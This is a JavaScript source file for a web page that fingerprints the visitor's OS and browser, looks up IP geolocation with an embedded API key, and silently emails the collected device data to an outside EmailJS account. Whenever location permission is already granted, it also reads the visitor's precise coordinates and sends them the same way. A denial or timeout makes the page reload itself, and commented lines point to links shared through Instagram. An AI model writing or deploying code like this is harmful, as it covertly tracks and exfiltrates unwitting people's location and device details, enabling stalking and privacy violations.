(function () {
    'use strict';
    
    var module = {
        options: [],
        header: [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera],
        dataos: [
            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
            { name: 'Windows', value: 'Win', version: 'NT' },
            { name: 'iPhone', value: 'iPhone', version: 'OS' },
            { name: 'iPad', value: 'iPad', version: 'OS' },
            { name: 'Kindle', value: 'Silk', version: 'Silk' },
            { name: 'Android', value: 'Android', version: 'Android' },
            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
            { name: 'Linux', value: 'Linux', version: 'rv' },
            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
        ],
        databrowser: [
            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
            { name: 'Safari', value: 'Safari', version: 'Version' },
            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
            { name: 'Opera', value: 'Opera', version: 'Opera' },
            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
        ],
        init: function () {
            var agent = this.header.join(' '),
                os = this.matchItem(agent, this.dataos),
                browser = this.matchItem(agent, this.databrowser);
            
            return { os: os, browser: browser };
        },
        matchItem: function (string, data) {
            var i = 0,
                j = 0,
                html = '',
                regex,
                regexv,
                match,
                matches,
                version;
            
            for (i = 0; i < data.length; i += 1) {
                regex = new RegExp(data[i].value, 'i');
                match = regex.test(string);
                if (match) {
                    regexv = new RegExp(data[i].version + '[- /:;]([\\d._]+)', 'i');
                    matches = string.match(regexv);
                    version = '';
                    if (matches) { if (matches[1]) { matches = matches[1]; } }
                    if (matches) {
                        matches = matches.split(/[._]+/);
                        for (j = 0; j < matches.length; j += 1) {
                            if (j === 0) {
                                version += matches[j] + '.';
                            } else {
                                version += matches[j];
                            }
                        }
                    } else {
                        version = '0';
                    }
                    return {
                        name: data[i].name,
                        version: parseFloat(version)
                    };
                }
            }
            return { name: 'unknown', version: 0 };
        }
    };
    
    var e = module.init(),
        debug = '';
    
    debug += 'os.name = ' + e.os.name + '<br/>';
    debug += 'os.version = ' + e.os.version + '<br/>';
    debug += 'browser.name = ' + e.browser.name + '<br/>';
    debug += 'browser.version = ' + e.browser.version + '<br/>';
    
    debug += '<br/>';
    debug += 'navigator.userAgent = ' + navigator.userAgent + '<br/>';
    debug += 'navigator.appVersion = ' + navigator.appVersion + '<br/>';
    debug += 'navigator.platform = ' + navigator.platform + '<br/>';
    debug += 'navigator.vendor = ' + navigator.vendor + '<br/>';

 var url = "https://ipgeolocation.abstractapi.com/v1/?api_key=b3193cff7e294160ad367a7142dc6d5e&ip_address=2405:201:c01f:70f7:c94d:571a:a789:9bb8"

var iplocation = httpGetAsync(url);

debug += iplocation;
checkLocationPermission();

//debug += locAccess



   //var resp = httpGet("http://ip-api.com/json?callback=");
   //console.log(resp);
   //getLocation(debug);
   //debug += resp;
    

    //checkLocationPermission();
    //console.log(debug);
    //document.getElementById('log').innerHTML = debug;

    var data = {
    service_id: 'service_qgtevq3',
    template_id: 'template_cugtf88',
    user_id: 'user_5P5qPe1MLssEJvPPBZjnQ',
    template_params: {
        'message': debug
    }
};

$.ajax('https://api.emailjs.com/api/v1.0/email/send', {
    type: 'POST',
    async: false,
    data: JSON.stringify(data),
    contentType: 'application/json'
}).done(function() {
    //console.log("mail is sent");
    //alert('Your message is sent successfully, You will not get a reply');
}).fail(function(error) {
    console.log('Oops... ' + JSON.stringify(error));
    //alert('Oops... ' + JSON.stringify(error));

});
/*
if(navigator.userAgent.includes("Instagram")){
    alert("If cannot continue, Use another browser");
    window.close();
    window.location.reload();
       window.location.href = "https://main.d6lstv6g57srw.amplifyapp.com/";
   }

*/

}());

function httpGet(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    //console.log(xmlHttp.responseText);
    return xmlHttp.responseText;
}

function checkLocationPermission()

{
    navigator.permissions && navigator.permissions.query({name: 'geolocation'})
    .then(function(PermissionStatus) {
        if (PermissionStatus.state == 'granted') {
             //console.log("Location access granted");
             getLocation();
             return "\n Granted";
        } else if (PermissionStatus.state == 'prompt') {
              //console.log("Location access NOT granted");
              return " \n Not granted";
        } else {
             //denied
             return "\n denied"
        }
    })
}

function getLocation()
{
     if(navigator.geolocation) {
        var options = {timeout:60000};

    navigator.geolocation.getCurrentPosition(showPosition, showError,options);
     }
     else {
               alert("Sorry, browser does not support geolocation!");
            }
}



function showPosition(position) {
    var location = position.coords.latitude +","+position.coords.longitude;
  console.log("Latitude: " + position.coords.latitude + 
  "Longitude: " + position.coords.longitude);

  var data = {
    service_id: 'service_qgtevq3',
    template_id: 'template_h1uk0oh',
    user_id: 'user_5P5qPe1MLssEJvPPBZjnQ',
    template_params: {
        'location': location
    }
};

$.ajax('https://api.emailjs.com/api/v1.0/email/send', {
    type: 'POST',
    async: false,
    data: JSON.stringify(data),
    contentType: 'application/json'
}).done(function() {
    //console.log("mail is sent");
    //alert('Your message is sent successfully, You will not get a reply');
}).fail(function(error) {
    console.log('Oops... ' + JSON.stringify(error));
    //alert('Oops... ' + JSON.stringify(error));

});


}

function httpGetAsync(theUrl) {

  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    //console.log(xmlHttp.responseText);
    return xmlHttp.responseText;
}

function showError(error) {   
  switch(error.code) {
    case error.PERMISSION_DENIED:
      //console.log("User denied the request for Geolocation.");
      //alert("Enable location access for this browser in your settings.");
      //window.location.reload();
      //window.close();
      window.location.reload();
      break;
    case error.POSITION_UNAVAILABLE:
     //console.log("Location information is unavailable.");
      break;
    case error.TIMEOUT:
     //console.log("The request to get user location timed out.");
     //alert("timeout");
     window.location.reload();
      break;
    case error.UNKNOWN_ERROR:
      //console.log("An unknown error occurred.")
      break;
  }
}


function deviceDetails(API)
{
    deviceAPI = API;
    var devicedetails= "devicetype:"+deviceAPI.deviceType+",devicebrand:"+deviceAPI.deviceBrand+"devicename"+deviceAPI.deviceName+"screenwidth"+deviceAPI.screenWidth+"screenheight"+deviceAPI.screenHeight+"screenratio"+deviceAPI.screeenRatio;
    console.log(devicedetails);

    var data = {
    service_id: 'service_qgtevq3',
    template_id: 'template_cugtf88',
    user_id: 'user_5P5qPe1MLssEJvPPBZjnQ',
    template_params: {
        'message': devicedetails
    }
};


$.ajax('https://api.emailjs.com/api/v1.0/email/send', {
    type: 'POST',
    async: false,
    data: JSON.stringify(data),
    contentType: 'application/json'
}).done(function() {
    //console.log("mail is sent");
    //alert('Your message is sent successfully, You will not get a reply');
}).fail(function(error) {
    console.log('Oops... ' + JSON.stringify(error));
    //alert('Oops... ' + JSON.stringify(error));

});


}


